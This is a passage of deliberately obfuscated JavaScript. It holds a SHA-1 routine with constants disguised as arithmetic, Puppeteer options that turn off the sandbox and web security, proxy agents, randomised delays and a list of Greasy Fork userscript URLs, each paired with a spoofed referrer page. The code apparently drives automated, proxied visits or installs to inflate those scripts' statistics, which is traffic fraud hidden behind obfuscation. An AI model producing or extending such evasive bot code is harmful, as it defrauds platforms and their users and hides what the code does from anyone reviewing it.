            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0x1 * -0x869 + -0x163 + 0x9d1 * 0x1 | v >>> -0x1634 + -0x1 * -0x1c8d + -0x63e) + (w & x | ~w & y) + z + (-0x6aa566f5 * -0x1 + -0x1 * 0x7ea09442 + -0x2a2 * -0x29f783) + A[q] << 0x98 * 0x35 + -0x370 * -0x1 + -0x22e8) << 0x15f + -0x1193 + 0x1 * 0x1039 | z >>> 0x12a6 + -0x1 * -0x1835 + -0x2ac0) + (v & (w = w << 0xe * -0x121 + 0x3d * -0x79 + -0x39 * -0xc9 | w >>> -0xd6f * -0x1 + -0x165b + 0x8ee) | ~v & x) + y + (0x7f63562a + -0x7d * -0xe67a5a + -0x956a9a83) + A[q + (0x237 * 0x3 + -0x1e51 + -0x1d * -0xd1)] << 0x1 * 0x5ad + 0xef7 * -0x1 + 0x52 * 0x1d) << 0x1 * -0x2690 + -0x3 * 0x9f5 + 0x1a * 0x2a2 | y >>> -0x1954 + 0x168 + -0x1 * -0x1807) + (z & (v = v << -0x61 * -0x4 + -0x80 + -0xe6 | v >>> 0x829 + 0x5 * 0x193 + 0x1006 * -0x1) | ~z & w) + x + (-0x717f93df + -0xb85 * 0xa1247 + 0x6aacddc9 * 0x3) + A[q + (0x2410 + -0x2d4 * 0x7 + -0x1042 * 0x1)] << -0x1 * -0x469 + -0x3f1 * -0x7 + -0x2000) << 0xe9b + -0x2470 + 0x15da | x >>> 0x24dc + 0x1b00 + -0x3fc1) + (y & (z = z << 0x2 * 0x281 + 0x1 * -0xe59 + -0x3 * -0x327 | z >>> -0x2e2 * -0x3 + -0xc47 * -0x3 + -0x2d79) | ~y & v) + w + (-0x58194647 + -0x4 * 0x2219a6f2 + -0x1 * -0x13b025ba8) + A[q + (0x72f * 0x2 + -0x29 * 0x71 + 0x3be)] << 0x2613 + -0x1b1e + 0x55 * -0x21) << -0x1 * -0x1b37 + -0xba0 + -0xf92 | w >>> -0x11f1 + -0x253b + 0x3747) + (x & (y = y << -0x1 * -0xeb7 + 0x283 * -0x3 + -0x710 | y >>> 0x7cf + 0x4bf + 0xc8c * -0x1) | ~x & z) + v + (-0xea2bf1 * -0x41 + -0x4e0498b8 + 0x6d11ea20) + A[q + (-0x1 * -0x4ff + 0x1 * -0x1e0b + 0x1 * 0x1910)] << -0xaa2 + -0x1e * 0x102 + -0x1 * -0x28de, x = x << 0x1afa + -0x1862 + -0x27a | x >>> 0x7a5 * 0x4 + 0xf95 * -0x1 + -0xefd;
          for (; q < 0x2029 + -0x42 * 0x8e + -0x49b * -0x1; q += -0x1 * 0x13b3 + -0x6 * 0x370 + -0x8 * -0x50b)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << 0x1 * 0x20d5 + 0x3 * -0x61d + 0xd * -0x11d | v >>> 0x1258 + 0x150c + 0x59 * -0x71) + (w ^ x ^ y) + z + (-0x94dfd21e + 0x834443c9 + -0x1ab * -0x4d03e2) + A[q] << -0x14 * 0xb5 + -0x86b * 0x2 + 0xa * 0x319) << -0x7f * 0x19 + 0x1d9e + -0x2 * 0x899 | z >>> 0x268f * 0x1 + -0x586 * 0x4 + 0x574 * -0x3) + (v ^ (w = w << 0x26f * -0x7 + 0x1b86 + -0xa5f | w >>> -0x95f + 0x6a4 + 0x2bd) ^ x) + y + (0xa76fa63c + -0x5 * 0x1a5305e7 + 0x4b0962e8) + A[q + (0x1814 + -0x135d * -0x1 + -0x2b70)] << 0x2 * -0x42a + 0x1c5e * 0x1 + -0x140a) << -0x1 * -0x529 + -0x2630 + -0x11a * -0x1e | y >>> 0x1d19 + 0x4 * 0x669 + -0x36a2) + (z ^ (v = v << 0x5 * 0x4c1 + -0x1ad0 + 0x329 | v >>> 0x1690 + -0xd * 0x2cd + 0xddb * 0x1) ^ w) + x + (-0x1 * 0x24ff2135 + -0x225c1913 + 0xb63525e9) + A[q + (0x155d + -0xfe9 + -0x29 * 0x22)] << -0x1516 + 0xad * 0x25 + -0x1 * 0x3eb) << -0x172 * 0x1 + -0x3 * 0x22d + 0x7fe | x >>> 0xf79 * 0x2 + 0x1 * -0x4f + -0x3d1 * 0x8) + (y ^ (z = z << -0xa1e + 0xc61 + 0x3 * -0xb7 | z >>> 0x101e * -0x1 + 0x1e1b + -0xdfb) ^ v) + w + (-0x2005b * 0x7bf + 0x2 * 0x267628a3 + 0x316e5b40) + A[q + (-0x1e77 + -0x1722 + 0x359c)] << 0x11a6 + -0x50b * -0x6 + -0x2fe8) << -0x162b + -0xb8 * 0x5 + -0x672 * -0x4 | w >>> 0x17 * -0x137 + 0x21fc + -0x5f0) + (x ^ (y = y << -0x1 * 0x285 + 0x132b * 0x1 + -0x1 * 0x1088 | y >>> -0x5bd + 0xab7 * -0x2 + 0x1b2d * 0x1) ^ z) + v + (0x2b315ccd + 0xe6d14c * -0x4 + -0x23a1ea02 * -0x2) + A[q + (0x335 * -0x5 + 0x1 * -0x1595 + 0x25a2)] << 0x1e44 + 0x15a0 + 0x6 * -0x8a6, x = x << -0xfb7 + -0x5d8 + 0x15ad | x >>> 0x17 * 0x19b + 0x1966 + 0x2b * -0x173;
          for (; q < 0x2478 + -0x96d * 0x2 + -0x1 * 0x1162; q += 0x1b44 + -0x35e * 0x2 + 0x1 * -0x1483)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x7bf * -0x1 + 0x1 * -0x11a5 + 0x9eb | v >>> -0xb65 + -0x1010 + 0x1b90) + (w & x | w & y | x & y) + z - (-0x9 * 0x127c05b3 + -0xfb * 0x2d65c3 + 0x143c33ca0) + A[q] << -0xe * -0x1d + 0xb * -0x1c5 + 0x11e1 * 0x1) << -0x1638 + 0xeb3 + 0x78a | z >>> 0x1 * -0x12e8 + 0x2569 + -0x1266) + (v & (w = w << 0x754 + -0x207c + 0x5 * 0x50e | w >>> 0x7 * -0x9c + -0x24ae + 0x28f4) | v & x | w & x) + y - (0x39d4 * -0xd5bf + -0x5f4639d8 + 0x3 * 0x557bacb8) + A[q + (-0x1 * 0x74f + 0x197e + -0x1a * 0xb3)] << -0x2 * -0x1073 + -0x3 * 0x78d + -0xa3f) << -0x2703 + 0x450 * 0x2 + 0x1e68 | y >>> 0xb * -0xc1 + 0xb3 * 0x17 + -0x119 * 0x7) + (z & (v = v << 0x1cd0 + -0x2f7 + -0x19bb | v >>> 0xa51 + -0x22bf + 0x1870) | z & w | v & w) + x - (-0xc537345b + -0xd * -0x9aee3c7 + 0x1313 * 0x9a88c) + A[q + (0x1291 + 0x5 * 0x301 + -0x2194)] << 0x1 * 0xccf + -0xdce + 0xff) << 0x43 * 0x24 + -0x20fb + 0x1794 * 0x1 | x >>> 0x1f1 * 0x14 + -0xb58 + 0x1 * -0x1b61) + (y & (z = z << 0x994 + -0x74f * 0x3 + 0xc77 * 0x1 | z >>> 0x266 * 0xd + -0x259e + 0x672) | y & v | z & v) + w - (0x69740484 * -0x1 + 0xc26b1 * 0x559 + -0x3ab9 * -0x29c97) + A[q + (0x9 * 0x416 + -0x4f * -0x21 + 0x2ef2 * -0x1)] << -0x11e2 + -0x906 * -0x1 + 0x8dc) << -0x1c29 + -0xaaa + -0x2 * -0x136c | w >>> -0x1667 + -0xa1f + -0x1 * -0x20a1) + (x & (y = y << 0x1 * -0x958 + 0x7 * -0x22c + -0x7 * -0x386 | y >>> -0x1966 + 0xe35 + -0x3d * -0x2f) | x & z | y & z) + v - (-0xa1c04b91 + -0x3 * -0x1a67bce + 0x10db11b4b) + A[q + (-0x67e + -0x24af * 0x1 + 0x2b31)] << -0xc95 + 0x1 * 0x245b + 0x2 * -0xbe3, x = x << 0xc56 * 0x3 + 0x1 * -0x243d + -0xa7 | x >>> 0x1330 + 0x137b * 0x1 + -0x26a9;
          for (; q < 0xebb + 0x1 * -0x605 + -0x866 * 0x1; q += -0x52a * 0x6 + -0x2 * -0x1a0 + -0xcb * -0x23)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x3aa + 0x2b3 * -0x2 + 0x915 | v >>> -0x3b * 0x6d + 0x91c + -0x80f * -0x2) + (w ^ x ^ y) + z - (-0x2b8bcdf7 + 0x1176bfe2 + 0x4fb24c3f) + A[q] << 0x14c * 0x13 + -0x1729 + -0x17b) << -0x353 * -0x1 + -0x86d + -0x1b5 * -0x3 | z >>> -0x543 + 0x1bc3 * -0x1 + -0x1 * -0x2121) + (v ^ (w = w << 0x2 * -0xa01 + -0x91c * 0x3 + -0x4 * -0xbdd | w >>> -0x1fea + 0x2 * 0x2bd + -0x54a * -0x5) ^ x) + y - (-0x3eb1e6cb + 0x83bff0d * 0x7 + 0x3aab2b9a) + A[q + (0x11db + 0x40e + -0x15e8)] << -0x620 + -0x9b3 + 0xfd3) << -0x5 * 0x47 + -0x73 * 0x44 + 0x664 * 0x5 | y >>> 0x9d * 0xd + -0x2 * 0x207 + -0x1e8 * 0x2) + (z ^ (v = v << -0x14cf + 0x36 * 0x79 + -0x499 | v >>> -0x263e + -0x17bc + 0x3dfc) ^ w) + x - (0x21e62 * 0x30a + -0xa66a878 + -0x1c05a1 * -0x20e) + A[q + (-0x1ed2 + -0x8b8 + 0x278c)] << -0x7ad + 0x4 * 0x6f3 + -0x12f * 0x11) << -0x71 * -0x20 + -0x4 * -0x781 + -0x2c1f | x >>> 0x57d + -0x178b + 0x1 * 0x1229) + (y ^ (z = z << 0xd * 0x233 + -0x1c0c * -0x1 + -0x3885 | z >>> 0x1a5b + 0x3 * 0xabc + -0x3a8d) ^ v) + w - (-0x253ca143 + -0x2f04517 * -0xb + 0x3a86e770) + A[q + (-0x10b7 + 0x1 * -0x1949 + -0xef * -0x2d)] << 0x1 * 0x18b9 + 0x2 * -0x1201 + -0x3c3 * -0x3) << -0x16d6 + 0x12d8 + -0x4f * -0xd | w >>> 0x3 * -0x413 + -0x2a * -0x59 + -0x123 * 0x2) + (x ^ (y = y << 0x7 * -0x455 + 0x1 * 0x21c7 + -0x7 * 0x7a | y >>> -0x12f8 * 0x2 + -0x7e7 + 0x2dd9) ^ z) + v - (-0x1ac1d18e * -0x1 + -0xdd37aa * -0x3d + -0x7 * 0x3b18c6a) + A[q + (0x3e9 * -0x7 + -0x1 * 0x134b + 0x2eae)] << -0x1c2f + 0x194a + 0x1 * 0x2e5, x = x << -0x172f * 0x1 + -0xb9 * 0x1 + 0xcd * 0x1e | x >>> 0x7b1 * 0x4 + -0x2 * -0x2ea + -0x2496;
          this['h0'] = this['h0'] + v << 0x192b + -0x1aed + 0x1c2, this['h1'] = this['h1'] + w << -0x5 * 0x3d7 + -0x23 * -0x4d + 0x8ac, this['h2'] = this['h2'] + x << -0x349 + -0x1319 * 0x1 + 0x2 * 0xb31, this['h3'] = this['h3'] + y << -0xed2 + -0x24 * -0xb5 + -0xaa2, this['h4'] = this['h4'] + z << -0x1a4a + -0x1a36 + 0x3480;
        }
        ['hex']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return e[q >> 0x136a + 0x21a7 * 0x1 + 0x1 * -0x34f5 & -0x20b * 0x11 + -0x2234 + -0x44fe * -0x1] + e[q >> 0x12 * 0x169 + -0x25ce + 0xc84 & 0x1786 + 0x854 + -0x1fcb] + e[q >> 0x5f0 + 0x7 * 0x11 + -0x653 & -0x2654 + 0x1 * -0x881 + 0x2 * 0x1772] + e[q >> -0x2e1 * 0x8 + 0x2375 + -0x3 * 0x41f & -0x1 * 0x163d + 0x6d * -0x25 + 0x260d] + e[q >> 0x1036 + 0x2 * 0x1025 + -0x3074 & 0x1f8d + -0x62 * -0x49 + -0xedc * 0x4] + e[q >> -0x4 * 0x1fc + 0x2195 + -0x199d * 0x1 & 0x2 * 0x1376 + -0x1cb9 + 0x3b * -0x2c] + e[q >> -0x4fa + -0x2336 + 0x2834 & 0x5fb * 0x6 + 0xa * -0x2b + -0x2225] + e[-0x1bbf + 0x1904 + -0x66 * -0x7 & q] + e[u >> -0x20 * -0x8f + -0x14b0 + -0x1 * -0x2ec & -0x1982 + -0x59 * 0x46 + -0x9fb * -0x5] + e[u >> 0x2 * -0x2e4 + 0x13f7 * 0x1 + -0xe17 * 0x1 & 0x2a * -0x94 + -0x464 + -0x5bf * -0x5] + e[u >> -0x21fa + 0x8d4 + 0xc9d * 0x2 & 0x25bc + -0x153 * 0x12 + -0xdd7] + e[u >> 0x2686 + -0xd3f + -0x1937 & 0x1faf * -0x1 + 0x11c5 + -0x31 * -0x49] + e[u >> 0x7 * -0x271 + -0xb99 + 0x1cbc & 0x1cf * 0xe + 0x1415 + -0x2d58] + e[u >> -0x4fb + 0x24e2 + -0x1fdf & 0x12b2 + 0x12 * 0x21a + -0x3877] + e[u >> 0xd5 * -0xa + -0x3f1 + 0x7 * 0x1c1 & -0x2007 + 0x3b * 0x89 + 0x83] + e[0x10c * 0xd + -0xb15 * 0x2 + 0x5 * 0x1b9 & u] + e[v >> -0x17 * -0x187 + -0x22a * -0x3 + -0x2983 & 0x9 * -0x1d + 0x211f + 0x1 * -0x200b] + e[v >> -0x1d03 + 0xd * 0x18f + -0x1 * -0x8d8 & 0x23f + -0x1a3 * 0x5 + -0x5 * -0x133] + e[v >> -0x266f + 0x9c9 * 0x3 + 0x125 * 0x8 & 0x1ad + -0x214f + 0x487 * 0x7] + e[v >> 0x1 * 0x7db + -0x1 * 0x5e + -0x76d & -0x613 + 0x52a + 0x1f * 0x8] + e[v >> -0x2 * -0xdf0 + 0x135c + -0x1 * 0x2f30 & -0x95 * 0x2e + -0x23ad + 0x3e82] + e[v >> 0x97c + 0x2 * -0x5b7 + 0x1fa & -0x974 + 0x7d3 * 0x2 + 0x623 * -0x1] + e[v >> -0x25e * 0x8 + 0x1f51 + -0xc5d & 0x6e * -0x33 + -0x1 * -0x1e86 + -0x88d] + e[0x97a + -0x29 * 0x9d + 0xfba & v] + e[w >> -0xc7 * -0x1c + 0x2 * -0x211 + -0x1 * 0x1186 & -0x1 * 0x1467 + 0x1 * 0x1179 + 0x2fd] + e[w >> -0x1d20 + -0x2342 + 0x407a & 0x1 * 0x16d9 + 0x3 * 0xb10 + -0x2 * 0x1bfd] + e[w >> 0xc7c + -0xd3 * 0x3 + -0x9ef * 0x1 & -0xabd + -0x577 + 0x1043] + e[w >> -0x9 * 0x3c9 + 0x1 * 0x1ed7 + -0x2 * -0x1a5 & -0x1367 + 0x1bf6 + -0x880] + e[w >> 0x2371 + 0x22a1 + -0x2303 * 0x2 & -0x191 * -0x9 + -0xd3 * -0x1b + -0x244b] + e[w >> -0x274 + 0x4 * 0x2fe + -0x97c & -0x3 * -0x75a + 0x1 * 0x1acd + -0x30cc] + e[w >> 0x1 * 0x185e + 0x2467 * -0x1 + 0xc0d & -0xa05 + -0x14 + 0xa28] + e[-0x13a * 0xe + -0x1348 + 0x2483 & w] + e[x >> -0xbae + -0xcc * -0x25 + 0xf * -0x12e & -0xae1 + 0xb1b + 0x1 * -0x2b] + e[x >> 0x20d9 + -0xaf * 0x39 + 0x636 & -0x1b15 + -0x22e7 + 0x3e0b * 0x1] + e[x >> 0xc20 * -0x3 + -0x27d + 0x26f1 * 0x1 & 0x6 * 0x516 + 0x2058 + -0x1 * 0x3ecd] + e[x >> 0x11b5 + 0x25c7 + 0x376c * -0x1 & 0x12d * -0x13 + -0x811 * -0x3 + -0x1cd * 0x1] + e[x >> -0x3 * 0x1bc + -0x1e69 + 0x23a9 & -0x2 * 0x9aa + 0x1039 * 0x1 + 0x32a] + e[x >> 0x1 * 0x85b + -0x7 * 0x34b + 0xeba & 0xf7b + 0x32b * 0x1 + -0x1 * 0x1297] + e[x >> -0x30a + -0x121d + 0x152b & -0x2 * -0xaa8 + 0x2 * 0x2ef + -0x1b1f] + e[0x9d8 + -0x3 * -0xcba + 0xffd * -0x3 & x];
        }
        ['digest']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return [
            q >> 0x1 * 0x937 + 0xff6 + -0x1915 * 0x1 & -0x1 * 0xec9 + 0x1 * -0xce3 + 0x1cab,
            q >> -0x1a2d + -0x562 * 0x2 + 0x2501 & 0x14ad * 0x1 + -0x1341 + 0x1 * -0x6d,
            q >> 0x137 * 0xa + 0x1024 + -0x1c42 & 0x2071 * -0x1 + 0x39a * 0x1 + -0x43 * -0x72,
            0x191e + -0x1018 + -0x1 * 0x807 & q,
            u >> 0x20cb + -0x2316 + 0x263 * 0x1 & 0x11d * -0x6 + 0x3 * -0x751 + -0x10 * -0x1da,
            u >> 0x2400 + -0x1adb + -0x4b * 0x1f & -0x222e + 0x90a + -0x1 * -0x1a23,
            u >> -0x1716 + -0x2ab * 0xd + 0x1 * 0x39cd & 0x23f6 + -0x2b * 0x7c + -0xe23,
            0x1b7 * -0x8 + 0x45f * -0x4 + 0x2033 * 0x1 & u,
            v >> 0xd * -0x1df + 0x94 * -0x16 + 0x2523 & 0x1957 * -0x1 + -0x14 * 0x56 + -0x210e * -0x1,
            v >> 0xaf4 + -0x1 * -0x215f + -0x2c43 & 0x61 * -0x29 + -0x13af * -0x1 + -0x327,
            v >> -0x1f68 + -0x71 * 0x2 + 0x2052 & -0x20c + 0x1c8b + -0x1980,
            0xc5c + -0x2e3 * 0x3 + -0x4 * 0xad & v,
            w >> 0x1198 + 0x2102 + -0x3282 & -0xd35 + -0x574 * 0x7 + 0x1a3 * 0x20,
            w >> 0xed1 * -0x2 + -0x1 * 0x153a + -0xcbb * -0x4 & 0x3 * 0x33f + 0x9ee + -0x12ac,
            w >> -0x121e + 0x1 * -0x4bd + 0x16e3 & 0x7e3 + 0x2008 + 0x4 * -0x9bb,
            0x1b9d * -0x1 + -0x1f * 0x71 + 0x2a4b & w,
            x >> -0x609 * -0x3 + -0x2e4 * -0xc + -0x9 * 0x5db & -0x1a81 + 0xffd * -0x1 + 0x2b7d,
            x >> 0x2615 + 0x13 * 0xb8 + -0x33ad * 0x1 & -0x43 * -0x35 + 0x1ae9 + 0x15 * -0x1e5,
            x >> -0x4dc * -0x1 + -0x1 * -0x155d + -0x1a31 & -0xb56 + 0x1 * -0x57b + 0x3 * 0x5f0, -0x1 * 0xe11 + -0x15dc + 0x24ec & x
          ];
        }
        ['arrayBuffe' + 'r']() {
          var q, r;
          return this['finalize'](), q = new ArrayBuffer(0x1801 + 0x7b4 * -0x4 + 0x6e3), (r = new DataView(q))['setUint32'](0x241e + -0x1db1 + -0x66d, this['h0']), r['setUint32'](-0xd66 * -0x1 + 0x196a + -0x26cc, this['h1']), r['setUint32'](-0x22ca + -0x20e3 + -0x43b5 * -0x1, this['h2']), r['setUint32'](-0x24f3 + 0x4 * 0x6cd + 0x9cb, this['h3']), r['setUint32'](0x7 * -0x3d7 + 0x2e * -0x43 + 0x26fb, this['h4']), q;
        }
    }
    o['prototype']['toString'] = o['prototype']['hex'], o['prototype']['array'] = o['prototype']['digest'];
    const p = k();
    return p;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = 0x312e * -0x1 + -0x194 + 0x30d1 * 0x2 + (0x17b9 + 0x5b * 0x5 + -0xdc8) * random(),
  MM_NETWORK_PATIENCE = (-0x107b * -0x1 + 0x731 * -0x5 + 0x137d) * NETWORK_PATIENCE,
  me = random()['toString'](-0x1d17 + -0x199b + -0x2 * -0x1b61)['substring'](0x1c01 + 0xebb * 0x1 + -0x557 * 0x8, 0x43 * 0x3a + 0xb79 + -0x1a9d),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process[aD(0x12, '$jtG')]['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + aE(0x11) + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + aD(0x16, 'gZ1j') + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': aD(0x1d, '#bsI') + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aE(0x8) + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + aF(0x14) + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
